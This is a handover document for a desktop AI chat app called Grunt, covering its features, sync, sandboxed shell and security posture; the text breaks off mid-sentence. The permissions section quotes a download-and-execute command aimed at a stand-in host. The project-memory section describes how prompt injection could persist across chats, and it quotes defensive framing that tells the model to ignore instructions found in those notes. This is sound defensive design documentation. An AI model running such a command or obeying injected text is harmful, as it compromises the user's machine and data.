# Grunt — handover

This replaces the previous handover, which was written before two feature
branches merged: the Settings UI (`5d8cd0b`) and the attachment lifecycle
work (`1ab07c0`, the current `main` HEAD). Everything in this repo lives on
`main` now — the `feat/grunt-v1` branch it used to describe is deleted, and
so is the execution ledger it pointed readers at
(`.superpowers/sdd/2026-08-12-grunt-v1/progress.md`, git-ignored, removed
during cleanup). Where this doc used to cite that ledger for specifics, it
now cites the source file it lives in instead.

**Status (5 October 2026):** 2,222 unit and integration tests pass (4
skipped) and 25 Playwright tests pass, including a two-server test of
pairing, sync and running a chat on the other machine; `npm run typecheck`
and `npm run build` are clean. `README.md` has a verified install → build →
run → mock-provider walkthrough, and how to pair two machines. The v2
section below says what v2 added; the sections after it were written for
v1 and still hold.

## v2: desktop app, machines and sync

v2 (plan *Products/Grunt/Design/Plans/2026-10-02-grunt-v2*, spec
*.../Specs/2026-10-02-grunt-v2-desktop-and-sync-design*) turns Grunt into a
desktop app and lets two machines share chats. Built so far:

- **Desktop shell** (`desktop/`, Tauri v2): bundled UI, the server as a
  sidecar on a random loopback port with a per-launch token, tray, single
  instance, start at login, a global hotkey with a quick-chat window,
  native notifications, native file and folder pickers, drag and drop, and
  `--open-folder` / `--send` arguments. Installers and a bundled Node
  runtime (Tasks 40-41, Deck #777-#778) are **not** built: the app still
  finds `node` on `PATH` and the server in this checkout.
- **Machines** (`packages/server/src/peer/`): every install is a node with
  an id (`node_self`) and a self-signed ECDSA P-256 certificate, made on
  first use and kept beside the secrets file as `node-<id>.crt/.key`. Its
  SHA-256 fingerprint is its identity. Settings → Machines pairs two
  machines with a one-time code; each pins the other's certificate and
  holds a bearer token from it (stored only as a hash on the issuing side).
  The peer listener (HTTPS, default port 4748, `--peer-port`/`--peer-host`)
  runs only while a peer exists or a code is shown.
- **Locations and portable folders** (`core/src/domain/workspace.ts`): a
  chat's (or project's) folder is either relative to a named location that
  each machine maps to its own path, or bound to one machine's absolute
  path. It's resolved per machine at turn time; a folder that doesn't
  resolve here blocks sending and asks where it is (or offers to make a
  location, or to run the chat on the machine that has it). Tool calls and
  results from another machine have that machine's location paths
  translated in the copy sent to the model; stored history is untouched.
- **Sync** (`store-sqlite/src/repos/sync.ts`, `peer/syncer.ts`): triggers
  keep a change log and tombstones; every synced row carries a hybrid
  logical clock stamp, chats one per field. A machine pulls from a peer when
  it connects, when the peer announces changes, and every minute while it's
  reachable. Newer stamp wins, chats merge field by field, delete wins over
  a concurrent edit, and divergent continuations become sibling branches.
  Synced: locations and their paths, connections (keys too, unless *keep
  the key on this machine*), models, profiles, projects and project memory,
  chats, messages (once not streaming), sent attachments and their blobs,
  usage. Never synced: grants, MCP servers, the audit log, peers, settings,
  unsent attachments, connection health, project memory history.
- **Running a chat on another machine** (`peer/forward.ts`): a chat's
  *Runs on* (Inspector) picks the machine whose folder, tools and local
  models it uses. Calls for a remote chat are forwarded over the peer
  listener and its stream relayed back; approvals are answered on the
  machine running the turn and audited with the machine they came from. If
  that machine is unreachable, the chat offers to run here instead.

**Notification clicks:** on Windows a notification is a WinRT toast shown
by `desktop/src-tauri/src/notify.rs`, and clicking it opens the chat. On
other platforms the Tauri notification plugin can't report clicks, so
clicking the tray icon opens the last chat notified about instead.

**Tested how:** two-node behaviour is tested with real servers over real TLS
on loopback, never mocks of each other: `server/test/peer/*.test.ts`
(pairing, an intercepting proxy, monitor, sync, remote runs) and
`web/e2e/two-node.spec.ts` (pair through the UI, run a chat on the other
machine, stop it, run here, see the branch arrive when it's back). A
seeded 500-operation run across two stores converges on five seeds
(`store-sqlite/test/sync.test.ts`). It has **not** yet been tried across two
physical machines.

## What works today

The original plan (Collectives `Products/Grunt/Design/Plans/2026-08-12-grunt-v1`) was 31
tasks across 8 milestones, M0–M7 all done, M8 partial (T29/30 — the Tauri
desktop shell — never built; T31, the e2e smoke test, done). Two more rounds
of work landed after that plan closed out:

- **Settings UI** (`5d8cd0b`). Before this, every connection, model, and
  profile had to be created against the REST API directly, and nothing in
  the web client ever set a chat's `workspaceRoot` — so the filesystem/shell
  tool runtime, while fully built and tested, was unreachable from the app.
  Both gaps are closed. See "Settings UI" below.
- **Attachment lifecycle** (`1ab07c0`). Unsent attachments can now be
  deleted, and their blobs are garbage-collected. Blob storage moved from
  one directory shared by every database to one per database. See
  "Attachments" below.
- **Projects** (spec `docs/superpowers/specs/2026-10-03-projects-design.md`).
  The sidebar groups chats as Pinned, each project, then No project. A
  project can carry a workspace folder and a default profile, which a chat
  started from the project's **+** copies when it is created (never later).
  Chats move between projects from the row menu (right-click, **⋯**,
  Shift+F10 or the ContextMenu key) or by dragging onto a group heading.
  Chats keep a manual order (`chat.sort_order`, highest first; activity no
  longer reorders them): drag a chat onto the top or bottom half of another
  row to place it there, filing, pinning or unpinning it to match that
  section, or use Move up / Move down in its menu. The desktop window sets
  `dragDropEnabled: false`, without which WebView2 on Windows swallows HTML5
  drag-and-drop (chat rows and files dropped on the composer alike).
  Deleting a project moves its chats to No project. Archive is reversible:
  archived chats sit in a "Show archived (N)" section at the bottom of the
  sidebar, where their menu offers Unarchive. See "Projects" below.
- **Tabs and layouts** (#824). Tabs are chats the user opens as tabs --
  right-click → Open in new tab, or drag a chat onto the tab bar -- from any
  project; a sidebar click shows a chat without making it a tab. The tab bar
  (`panes/TabBar.tsx`) has a layout picker: one chat, two side by side, two
  stacked, three side by side, one big with two stacked, four in a grid
  (`panes/PaneGrid.tsx`). Each layout is a tree of splits (`LAYOUT_TREES`);
  the bar between panes drags, or moves with the arrow keys, and each
  split's sizes are remembered per layout (`Splitter.tsx`; double-click to
  even out). A pane's header button, a double-click on the header or
  Ctrl+Shift+Enter maximises the focused pane; the others stay mounted,
  hidden, so they keep streaming and keep their drafts. Ctrl+1..4 (or
  Alt+1..4) focuses a pane and Ctrl+Tab / Ctrl+Shift+Tab cycles tabs
  (`usePaneShortcuts`; a browser keeps Ctrl+Tab for itself). Each pane is a full
  thread with its own live connection (`useChatSync` per pane; only the
  focused pane reports the header's connection status). The focused pane's
  chat is always `activeChatId`, so anything that opens a chat fills the
  focused pane, or focuses the pane already showing it; the Inspector
  follows. Drag a chat or a tab onto a pane to show it there; drag tabs to
  reorder. ✕ only closes the tab. Dots mark a tab replying or waiting for an
  approval (the app-wide stream's `hello` lists running replies). Tabs,
  layout and panes are stored per device (`state/panes.ts`); a narrow window
  shows only the focused pane. Threads are `<section>`s inside the grid's
  one `<main>`.
- **Export** (#820). A chat's menu has Export… > Markdown (the conversation
  as shown: the head's branch, kept compare replies only) or JSON (every
  message on every branch, usage rows and attachment references, never
  attachment content). `GET /api/chats/:id/export?format=markdown|json`;
  the formatting is `packages/core/src/domain/export.ts`. The client fetches
  with auth and saves a blob, so it works in the desktop window too.
- **Import from claude.ai** (spec
  `docs/superpowers/specs/2026-10-09-claude-import-design.md`). Settings >
  Import reads a claude.ai data export from a folder, either the ZIPs as
  downloaded or what is in them, and brings in every conversation with all
  of its branches, the named projects with their instructions and docs, the
  published artifacts (a chat each) and, if the box is ticked, claude.ai's
  memory condensed by the memory model into the learned note and each
  project's note, with an About you drafted for the user to read and save
  from the report (it goes into every chat as their own words, so the
  import never saves it).
  `POST /api/import/claude/preview` says what an import would do,
  `POST /api/import/claude` starts it (202) and `GET /api/import/claude`
  reports on it. The mapping is `packages/core/src/domain/claude-import.ts`
  and the job `packages/server/src/import/claude-import.ts`. claude.ai's
  ids are kept, so importing the same export again skips what is already
  there, and each chat is written in one transaction (`Store.transaction`)
  so a failed chat leaves nothing behind. Imported chats start with both
  memory cursors at their newest message, which keeps the memory sweeps
  from summarising hundreds of old chats. Project docs and every claude.ai
  memory file are written under `<db>.imported/claude/`, and a project's
  docs folder is attached to it read-only. claude.ai's memory notes (49 of
  them, about 64,000 characters, on the export tried) are also imported as
  one chat, "What claude.ai remembered", a note a message: About you and the
  learned note hold 4,000 characters each, and this keeps the rest within
  recall's reach (its chat search covers every chat) without adding it to
  every prompt. The export has no image or file
  bytes, so those show as a note in their message: bracketed text on the
  user's side, so an API replay doesn't drop an image-only turn, and a
  notice on a reply. Tool calls claude.ai left without an id get ones every
  provider accepts, and `replayToolName` (`engine-aisdk/src/convert.ts`)
  turns names such as `Home Assistant:ha_get_state` into a form providers
  take on the way to the model. A real export (486
  conversations, 6,532 messages) imported 442 chats in about 15 seconds,
  plus about 30 seconds for seven memory calls; the other 44 conversations
  came through blank and are left out.
  The export doesn't say which project a chat was in or which branch it
  showed. claude.ai's own chat list does (`chatListUrl`, the page its
  sidebar loads), so when the user saves it into the folder as
  `chat_conversations.json` the import files each chat under its project
  and opens it on that branch; a re-run files chats already imported that
  are still in No project, never moving one the user filed. The preview
  gives the list's URL, with the organisation read off the export's
  manifest. Projects are written before chats, so a chat is filed as it's
  written, and the panel fetches the projects and chats again when an
  import ends, since the server doesn't announce projects as it makes them.
- **Import from Cowork** (same panel). Cowork sessions aren't in the
  claude.ai export: Claude Desktop keeps them on the machine, under
  `%APPDATA%\Claude\local-agent-mode-sessions` on Windows, as a metadata
  file and a Claude Code transcript each. With the box ticked, each session
  becomes a chat (`packages/core/src/domain/cowork-import.ts`): a prompt is a
  user message and the rest of the turn one reply, labelled with the model
  that made it, following the branch the session ended on. Pasted images go
  into the blob store as real attachments, pinned until their rows exist as
  an upload's are. Only claude.ai knows the spaces' names, so the panel
  names each space by a few of its sessions' titles and the user picks its
  project. `GRUNT_COWORK_ROOT` points the server at another folder, or
  nowhere when empty; the e2e server gets a fixture folder that way.
  Sessions are only kept on the machine they ran on, so the folder chosen
  in the panel is searched for Cowork sessions as well as an export: a copy
  of another machine's `local-agent-mode-sessions` folder, on its own or
  inside the export's folder, brings that machine's sessions in
  (`findCoworkFolders` looks up to five folders down for the
  `local_<id>.json` files, never inside a session's own folder). The export
  is optional, and with no folder at all the panel checks just this
  machine's sessions. A session found in both places is imported once, and
  the preview lists each place with how many sessions came from it. The
  export reader skips `local_*` folders too, so a file a session wrote can't
  pass for part of the export.
- **App-wide events** (#771, v2 plan Task 34). `GET /api/events` is an SSE
  stream of `AppEvent`s (`packages/core/src/types/events.ts`): chat
  created/updated/deleted, turn started/finished, approval
  requested/resolved, with a 25-second keepalive comment. It opens with a
  `hello` listing pending approvals. Chat events come from the store's chat
  repo being wrapped (`withChatEvents`, `server/src/stream/events.ts`), so
  every change is announced whoever makes it; project delete announces the
  chats it moved. Posting a turn now sets the chat head to the new user
  message server-side, so the turn's chat-updated event never carries a
  stale head. The web app subscribes once (`useAppEvents`) and keeps chats
  and `selectPendingApprovalCount` current.
- **Desktop notifications** (#775, Task 38). While the window isn't focused,
  a finished or failed reply and a tool call needing approval raise a native
  notification titled with the chat, once per message or request
  (`packages/web/src/desktop/notify.ts`, shown by the shell's
  `show_notification`, `desktop/src-tauri/src/notify.rs`). Settings →
  Desktop has a toggle for each, stored per device. The tray tooltip counts
  pending approvals (#792). Click behaviour per platform: **Windows** -- the
  shell shows the toast itself (`tauri-winrt-notification`) with an
  activation handler, so clicking it brings Grunt forward on that chat (a
  dev build's toasts are shown under PowerShell's app id, as the
  notification plugin does). Clicking the tray icon also opens the chat
  last notified about. **Linux/macOS** -- `tauri-plugin-notification`,
  which doesn't report clicks, so only the tray fallback; not checked by
  hand yet.
- **Files and folders** (#776, Task 39). `GET /api/fs/dirs?path=<abs>` lists
  one folder's sub-folder names (never files; links not listed; drive roots
  on Windows). `POST /api/chats/:id/attachments/from-path {path}` attaches an
  inert raster image straight from disk (by extension, 25MB cap, JSON body
  only); it reads a caller-named file, so it must never be exposed on the
  peer listener (Task 46). In the desktop app the Inspector's folder form
  has **Choose folder…** (native dialog, `tauri-plugin-dialog`); the composer
  has an **Attach** button in both modes (a file input, which WebView2 shows
  as the native picker) and now loads a chat's unsent attachments as chips
  when it opens. `--open-folder <path>` and `--send <file>...` open a new
  chat (default profile) with that folder, or those images attached; the
  first launch's arguments come from the `launch_args` command, once, later
  launches' through `open-args`. Explorer verbs arrive with the installer
  (Task 41).
- **Quick chat** (#774, Task 37). A global hotkey (default `Ctrl+Alt+G`,
  `tauri-plugin-global-shortcut`, `desktop/src-tauri/src/hotkey.rs`) shows a
  second, always-on-top, undecorated window (`quick`) centred on the monitor
  under the cursor. It loads the app with `?view=quick` and `App` renders
  `views/QuickChat.tsx` there (also keyed off the window label, so the full
  app never runs twice): a message box and the reply in a new chat with the
  default profile. **Expand** hands the chat to the main window
  (`open_chat`); `Esc` hides the window, keeping the chat. Settings →
  Desktop changes the hotkey (stored per device); a key another app holds is
  reported there and the previous one put back.
- **Sandboxed shell** (spec `docs/superpowers/specs/2026-10-12-sandbox-design.md`):
  a profile's "Shell runs" can be "in the sandbox", a Grunt-owned WSL2 distro
  (`grunt-sandbox`) where each command runs under `@anthropic-ai/sandbox-runtime`
  0.0.79, sees only its chat's folders (read-only ones read-only) and reaches
  only allowlisted hosts; any other host is a `sandbox_network` card. Under
  "ask on mutate" sandboxed commands need no card. Both engines: API profiles
  get the sandboxed `run_command`, Claude Code gets it through Grunt's relay in
  place of Bash. Settings > Sandbox sets it up, repairs and removes it; nothing
  is set up until you press Set up. `@grunt/sandbox` holds the backend; the
  in-VM agent is `packages/sandbox/resources/agent.mjs`.
- **Remote access** (Deck #936). `grunt serve --public-url https://… --tls auto`
  (or `--tls-cert/--tls-key`, or `--trust-proxy`) runs Grunt for other
  devices' browsers behind a password set with `grunt password`; see the
  README's *Use it from another device*.

## Settings UI

A **Settings** button in the header (`App.tsx`) opens a full-screen overlay
(`packages/web/src/views/SettingsView.tsx`) with four tabs, each its own
panel under `packages/web/src/views/settings/`:

- **Connections** (`ConnectionsPanel.tsx`) — add/edit/delete a connection for
  any provider kind (`anthropic`, `openai`, `openai_compatible`, `google`,
  `ollama`, `mock`), **Test** it, and **Discover models** on it
  (`POST /connections/:id/discover-models`). The API key field is
  write-only: the server never returns a stored key, only a `secretRef`, and
  the form never pre-fills it — you either type a new one or tick "Clear."
- **Models** (`ModelsPanel.tsx`) — edit a model's capability flags
  (`supportsVision`, `supportsTools`), context window, and pricing
  (`priceInPer1m`/`priceOutPer1m`/`priceCachedPer1m`). A hand-edited row is
  marked `source: 'manual'` server-side (`routes/models.ts`) so a later
  re-discovery from the same connection doesn't silently overwrite it.
- **Profiles** (`ProfilesPanel.tsx`) — system prompt, sampling params
  (temperature, top-p, max output tokens, thinking budget), and tool policy
  (fs mode, shell on/off, approval mode, and an MCP-server allowlist
  checklist).
- **MCP Servers** (`McpServersPanel.tsx`) — full CRUD (create/edit/delete)
  for stdio and HTTP servers, env vars and headers (write-only, same pattern
  as connection API keys), and live health via the same 4-second poll the
  Inspector uses (`usePolled`, `packages/web/src/lib/usePolled.ts`).

**Ollama discovery seeds capabilities from Ollama's own API**, not just an
OpenAI-compatible shape: `AiSdkChatEngine` hits Ollama's native `GET
/api/tags` (`packages/engine-aisdk/src/engine.ts`) and reads each model's
`capabilities` array and `details.context_length` to set
`supportsVision`/`supportsTools`/`contextWindow` — richer than a generic
`openai_compatible` endpoint can offer, since that protocol has no
equivalent metadata.

**The tool runtime is now reachable end to end.** The Inspector
(`packages/web/src/panes/Inspector.tsx`) has a Workspace section: type in a
native, absolute path and it's saved via `PATCH /chats/:id` — that's the one
field `PermissionBroker.decide` requires to be non-null before it allows any
fs/shell tool call (`packages/core/src/domain/permissions.ts`). The server
now validates it too (`packages/server/src/validation.ts`, checked against
the server's own OS convention). Before this, the field existed only as a
type in the web API client and no component ever set it — every chat
created through the app had `workspaceRoot: null` and no tool could ever
run. Confirmed working via a scratch server and the mock provider's `#tool`
trigger while writing this doc.

The merge review for this branch found one Critical (opening the MCP env
editor and saving destroyed the stored secrets) plus nine further findings,
all fixed and re-verified against a real encrypted `SecretStore` and a real
Ollama instance.

## Attachments

`GET/POST /chats/:id/attachments`, `GET /attachments/:id`, `GET
/attachments/:id/content` — and now `DELETE /attachments/:id`
(`packages/server/src/routes/attachments.ts`).

- **Deleting an unsent attachment** (`messageId === null`) removes its row
  and, if no other row references the same content hash, its blob. **A sent
  attachment can't be deleted** — `attachment.messageId` is bound the moment
  a turn is sent (`packages/core/src/domain/turn.ts`), and the route returns
  409: it's part of that message's history, and deleting it would make the
  transcript misrepresent what was actually sent to the model.
- **Blob storage is per database now.** `resolveAttachmentsRoots`
  (`packages/store-sqlite/src/blob-store.ts`) derives `<db file
  path>.attachments/` from the database's own full filename — e.g.
  `grunt.db.attachments/`. Before this fix, every database's blobs lived in
  one directory derived from `secrets.json`'s own location, so two databases
  in the same directory (or two `:memory:` runs, which both resolved to the
  default `~/.grunt`) shared one attachments folder and each one's cleanup
  sweep deleted the other's blobs. The old shared `<dir>/attachments/`
  directory is now **read-only**: `BlobStore.get()` still falls back to it so
  attachments uploaded before this change stay servable, but nothing ever
  writes to or sweeps it again — **do not delete it**, or those older
  attachments 404. `createContainer` (`packages/server/src/container.ts`)
  logs a warning on startup if it still exists.
- **Blobs are garbage-collected** when no attachment row references their
  content hash any more: after a delete, after chat/profile/connection
  cascade deletes, and in a startup sweep (`packages/store-sqlite/src/blob-gc.ts`).
  A filesystem-level GC failure (locked file, permissions) is logged and
  swallowed — it never fails the request or the boot — but a programming
  error is not swallowed and surfaces as a 500.
- **`storagePath` no longer appears in any `Attachment` API response.**
  `toPublicAttachment()` strips it before every `c.json()` call in that
  route; it's still used internally (loading the blob to serve `/content`),
  just never sent to the client.
- **Office files and files as text (Deck #928).** Uploads of .docx/.docm,
  .xlsx/.xlsm and .pptx/.pptm (by MIME type or extension; the main part in
  the ZIP decides what it really is) are read into `extracted_text` by
  Grunt's own extractor (`server/src/office/`: the claude.ai import's ZIP
  reader plus a small XML scanner, no new dependencies). Word gives headings,
  lists and tables as Markdown; Excel gives each sheet as CSV plus its
  formulas with cached values; PowerPoint gives each slide's text, tables
  and notes. A part over 32 MB is skipped with a note, reading stops at
  64 MB of parts or 100,000 characters, and a DOCTYPE is refused. A part is
  read once however often (and in whatever case) it's named, and every read
  is charged to the 64 MB; the skip notes are deduplicated and capped. The
  scanner and the three readers are linear in the size of a hostile part and
  stop appending at the character cap (a paragraph, cell or table is never
  held past it); the hostile cases are tests with time bounds. A
  hostile file can still hold the upload request for about 10-15 seconds
  (the scanner runs at about 4-6 MB/s and the parts total can reach 64 MB). `.txt .tsv .json .log` and
  `application/json` are plain text now too. Every attached file that isn't
  a PDF reaches the model as that text, fenced as `<attached-file
  name="…">`, for every engine (`TurnRunner.filesForModel`); API models
  still get PDFs as PDFs, Claude Code gets their text. A file with no text
  becomes a placeholder and a notice on the reply. Attachments uploaded
  before this change have no text and get the placeholder: attach them
  again. Until then such an attachment re-triggers the "couldn't read"
  notice on every later turn of its chat, since `filesForModel` runs over the
  whole history. Not read: headers, footers, footnotes, comments, charts, masters.

The review for this merge found two Criticals in the first cut (the
sent-attachment delete guard was never actually armed in production; the
startup sweep deleted other databases' blobs) and the re-review found two
more data-loss paths in the fix itself (same-stem databases still colliding
— e.g. `main.db` and `main.bak` before the fix derived the write root from
the full basename, extension included; a snapshot-vs-unlink race letting the
sweep delete a blob a concurrent upload had just written). All four closed
and verified with the reviewer's own reproduction probes — see
`packages/store-sqlite/test/blob-gc.test.ts` and
`packages/server/test/attachment-roots.test.ts`, which encode those probes
as regression tests.

## Projects

- **Data.** `project` table and `chat.project_id` (migration `007-projects`),
  both foreign keys `ON DELETE SET NULL`: deleting a project never deletes
  chats, deleting a profile clears it as a project default. Archiving a
  profile clears it too (`PATCH /profiles/:id` calls
  `clearProjectDefaultProfile`). `ProjectRepo.list()` orders by
  `sort_order`, then name (`NOCASE`), then id; `compareProjects` in
  `packages/core/src/domain/projects.ts` is the same order in JS.
- **API.** `GET/POST /api/projects`, `PATCH/DELETE /api/projects/:id` (name
  trimmed, 1-80 chars; folder validated like a chat's; default profile must
  exist and not be archived). `POST /api/chats` takes `projectId`: with no
  `workspaceRoot` key the chat gets the project's folder (an explicit `null`
  means no folder), with no `profileId` it gets the project's default, else
  the app default. `PATCH /api/chats/:id { projectId }` moves a chat without
  touching its folder or profile, and doesn't bump `updatedAt`.
- **UI.** `panes/ChatList.tsx` wires `panes/sidebar/*` (`buildSidebar`,
  `ChatRow`, `ProjectGroup`, the project editors). One `components/Menu.tsx`
  serves both the chat menu and the project menu; it opens from right-click,
  the **⋯** button, or Shift+F10 / the ContextMenu key on a focused row.
  Collapse state is per device, in `localStorage` key
  `grunt.collapsedGroups`; whether the archived section is open is in
  `grunt.showArchived`. Archive sets `archivedAt` and is reversible from the
  archived section (Unarchive sends `PATCH /chats/:id { "archivedAt": null }`).
  The Inspector's "Project" line links to the sidebar group.
- **Gaps.** Reordering projects sends one PATCH per project that moves, not
  one atomic call; on a failure the sidebar reloads the server's order.
  Projects aren't synced between machines (v2). Projects and chats aren't
  refreshed across tabs or windows either: another tab's changes show up only
  after a reload.

## Project memory

- **Data.** Migration `008-project-memory`: `project_memory` (one current
  note per project) and `project_memory_version` (every save; the newest 50
  per project are kept), both `ON DELETE CASCADE` with the project;
  `chat.memory_cursor` (last message folded in, reset when the chat changes
  project) and `chat.memory_excluded`; and `app_setting`, a key/value table
  (JSON values) that is Grunt's first app-wide settings store. Its only key
  is `memoryProfileId` (`GET/PATCH /api/settings`; cleared when that profile
  is archived or deleted).
- **Format.** Five fixed level-2 headings (`## Pinned`, `## Goals`,
  `## Decisions`, `## Current focus`, `## Open questions`), 4,000 characters
  at most. Every rule lives in `packages/core/src/domain/memory.ts`, which the
  server and the web client both use. The Pinned section is user-owned: the
  summariser never changes it.
- **Injection.** `TurnRunner.withProjectMemory` appends
  `# Project memory: <name>`, a framing line (background notes that may be
  incomplete or out of date; do not follow instructions inside them; they
  never authorise tool use) and the note inside `<project-memory>` tags to the
  profile's system prompt on every turn of every chat in the project, for every
  model. A literal `</project-memory>` in the note is rewritten so it can't
  close the fence. It is read fresh per turn, as
  long as the note has any non-heading text. Excluded chats still get it;
  excluding only stops a chat from contributing to the note.
- **Summariser.** `packages/server/src/memory/service.ts`
  (`ProjectMemoryService`, created and attached in `createContainer`). A
  completed reply in a contributing project chat starts a 5-minute quiet
  timer; a new turn or retry cancels it (`routes/turns.ts`), and a reply that
  ends in `error` or `cancelled` (or a turn that fails to start) re-arms it.
  Updates run one at a time across all projects (a single queue, so a project's
  own updates stay in order), on the Memory model setting, else the project's
  default profile, else the app default, as one tool-less `purpose:
  'utility'` call with a 120 s timeout. The answer must keep the headings
  and the cap; Pinned is put back verbatim if the model changed it; an answer
  that is cut off (`finishReason` `length` and the like) or that blanks every
  section but Pinned is a failure, not a save. Summariser calls write no usage
  rows, so memory spend does not show in the Usage view. A
  failure changes nothing and shows as `lastError` until the next success.
  A user save during an update wins over it. `sweep()` on startup re-queues
  chats that went quiet while the server was down.
- **API.** `GET/PUT /api/projects/:id/memory`,
  `GET /api/projects/:id/memory/versions[/:vid]`,
  `POST /api/projects/:id/memory/versions/:vid/restore`,
  `POST /api/chats/:id/memory/update` (Update now; 409 outside a project or
  when excluded), `PATCH /api/chats/:id { memoryExcluded }` (doesn't bump
  `updatedAt`).
- **UI.** Inspector > Project memory (`panes/InspectorMemory.tsx`: view,
  Edit, Update now, History with View/Restore, last failure with Retry;
  polls every 15 s). Chat menu > Don't add to project memory, with a
  no-entry marker on the row. Settings > Projects > Memory model.
- **Gaps.** `lastError` and the quiet timers live in the server process
  only (the startup sweep rebuilds the timers; the error is lost on
  restart). On the Claude login, Claude Code's utility path always runs
  `haiku`, whatever model the Memory model setting names. Only the chat's
  active path is summarised; an unresolved compare turn contributes once a
  variant is picked, and is folded in after the next completed reply in that
  chat. There is no automatic backfill on upgrade: migration 008 seeds every
  existing chat's cursor to its newest message, so only new turns are
  summarised; use Update now in a chat to fold its older history in. The
  startup sweep re-queues contributing chats whose completed reply is not yet
  folded in (excluded chats and chats with no reply are skipped). The Inspector panel polls every 15 s
  rather than being pushed updates. Un-excluding a chat, or moving it into a
  project, does not re-queue it; it is picked up after its next completed
  reply or the next startup sweep. A `## x` line inside a code block in the
  note is treated as a heading, so the note is rejected as having the wrong
  headings.

## What is NOT built

- **A release pipeline** (v2 Task 41). `npm run app:installer -w
  @grunt/desktop` makes a per-user Windows installer locally (bundled
  server, bundled Node runtime); there's no `release.yml`, no code signing,
  no Explorer verbs (*Open folder in Grunt*, *Send to Grunt*), and no Linux
  packages. Task 40's Node SEA wasn't tried: see Deviations.
- **The tray's machine status line** (part of Task 48): the peer statuses
  exist (Settings → Machines, `peer-status` events) but the tray menu
  doesn't show them yet. It needs a Rust change in `tray.rs`.
- **A folder browser for another machine's folders** (part of Task 53).
  The plan forwarded `GET /api/fs/dirs` over the peer listener; that route
  is deliberately never mounted there (it lists directories anywhere on the
  machine), so choosing a folder for a chat that runs elsewhere is a typed
  path, classified against that machine's locations.
- **"Also active on PC"** in the workspace header (Task 53) is not shown.

## Security posture, stated without euphemism

**The peer listener is remote control of this machine, by design.** A
paired machine can run a chat here, and that chat's turn can run the
unsandboxed shell tool once a person approves it. The defences: mutual TLS
with both certificates pinned at pairing plus a per-peer token; the
listener off until pairing and bound only to the chosen hosts (default:
every interface; `--peer-host` to narrow it); only the chat-running routes
and `/peer/*` mounted on it, never settings, folder browsing or attaching
by path; immediate revocation; approvals never delegated (each tool call
still needs an approval or a grant on the machine running it); every
approval audited with the machine it came from. Pairing codes are
single-use, last ten minutes, and are cancelled after five wrong guesses.

**Sign-in mode is the whole UI on the network, by design** (`--public-url`,
spec 2026-10-12-remote-access). A signed-in browser is the box's user
account: it can approve shell commands, browse any folder (`GET
/api/fs/dirs`), attach a file by path and import from a folder. The
defences: a password (scrypt, at least 12 characters, in `login.json`, not
the database) and a session cookie (`__Host-`, `HttpOnly; Secure;
SameSite=Strict`, counted only when `Sec-Fetch-Site` says same-origin);
HTTPS only (no plain-HTTP sign-in, no HSTS, no redirect); a Host check
against the public URLs; the cross-site write check; 5 wrong passwords lock
an address out for 15 minutes and 100 in an hour close sign-in for everyone,
which trades guessing for denial of service; `/view/` links work only from
the address that made them (weak behind shared NAT, nothing behind a proxy
that sends no `X-Forwarded-For`); and `frame-ancestors 'none'` on the UI in
every mode. With `--tls auto` the first visit is trust-on-first-use: only
checking the CA's fingerprint against `grunt serve`'s own output stops a
man in the middle. The CA's private key is thrown away after it signs the
one server certificate, so a stolen disk can't mint certificates that
devices trusting it would accept. Sessions live in memory: a restart signs
everyone out.

**The host shell tool (`run_command` with `shellRuns` absent or `host`) is unsandboxed by design.** It executes
whatever command string the model produces on the real OS with the real
user's privileges; there is no seccomp, no container, no restricted PATH.
The *only* control on it is the approval gate — every call needs a human
decision unless a grant already covers it — so the gate has to be right,
because it's the entire defense, not one layer of several.

**The sandboxed shell has two walls, and a break-out of the inner one reaches more than its own chat.** With `shellRuns: 'sandbox'`, `run_command` runs in the `grunt-sandbox` WSL2 distro (interop and automount off) under the sandbox runtime (bubblewrap, a filtering proxy). The runtime keeps a command to its chat's folders, its home `/home/grunt/chats/<chat>` and its own temp folder, and off the network except allowlisted hosts. A command that broke out of the runtime would reach everything in the distro, every folder mounted for any chat with a running agent (read-write where some chat has it writable), and the VM's network; with WSL's `networkingMode=mirrored` that includes services on this machine that only listen locally, Grunt's own API among them, which is why Settings > Sandbox warns about it. In remote access's sign-in mode (`--public-url`) Grunt listens on a non-loopback address, so even in WSL's default NAT mode a break-out could reach Grunt's port over the VM's virtual network; there it would find only the password-protected HTTPS sign-in (and the OAuth callback, which needs a pending flow's 256-bit `state`), and Settings > Sandbox doesn't warn about this case. A break-out of the VM reaches Windows (Hyper-V's boundary, as with Cowork). drvfs mounts carry the Windows user's own rights, so read-only is enforced by the runtime (`denyWrite`) and, when no running chat needs a folder writable, by a read-only mount as well. drvfs folders also ignore case while the runtime's binds and guards hold one spelling, so a read-only folder nested in a writable one is refused and the agent puts back the files that make code run on Windows (git hooks and config, `.vscode`, Claude Code's settings and hooks, ...) after every command; a planted file exists until the command ends (see "The sandbox" below). The runtime is beta (0.0.x) and pinned; setup's self-test runs again on every Repair and any surprise marks the sandbox failed. Antivirus can't see inside the VM.

The temp folders are part of the inner wall. `/tmp` is unreadable inside a command, so each run gets its own folder under `/tmp/grunt-chats/<chat>/<run>`, and the runtime's sockets live in `/tmp/grunt-chats/<chat>/rt`. The runtime sets `TMPDIR` itself inside bubblewrap from `CLAUDE_CODE_TMPDIR`, which is why the agent points that at the per-run folder before each wrap (a `TMPDIR` in the spawn environment is ignored, and with `/tmp` denied and the sockets left in it every connection fails).

**Project memory is a persistent cross-chat channel for model-written
text.** Whatever the summariser distils from one chat is injected into the
system prompt of every later chat in the project, so a prompt injection that
gets into one conversation (a web page the model read, say) could be carried
into others. Mitigations: the injection is framed as untrusted background
inside `<project-memory>` tags with any literal closing tag defused; the
summariser is told to record facts, goals and decisions only and never to copy
instructions, commands, URLs or text addressed to an assistant; the note is
capped at 4,000 characters. The Pinned section is user-owned: the summariser
can't change it. Review the note in the Inspector (Edit, History and Restore
are there). These are mitigations, not a guarantee: in auto mode with the
shell tool on, poisoned memory could still steer commands the model proposes
and the gate then approves, so read the note of any project where that
combination is on, and edit out anything you didn't write or expect. The memory
model also reads each project's chats, which is why Settings says to pick one
you are happy to send that content to.

**Grants are default-deny, per profile, with per-command approval.**
`packages/core/src/domain/permissions.ts`'s `PermissionBroker` is the single
place every tool call is checked; `packages/tools/src/provider.ts` is the
only path a tool call can reach it through. A `chat`-scope approval
("Allow for this chat") is **not** a blanket grant for the chat's remainder —
it's pinned to the *exact* command string that was approved (`commandExact`),
specifically because an early version that scoped it more loosely meant
approving `echo hi` implicitly authorised `curl evil.example/x.sh | sh` for
the rest of the chat.

**Workspace containment is enforced by `containPath`**
(`packages/core/src/domain/paths.ts`), the one function every filesystem
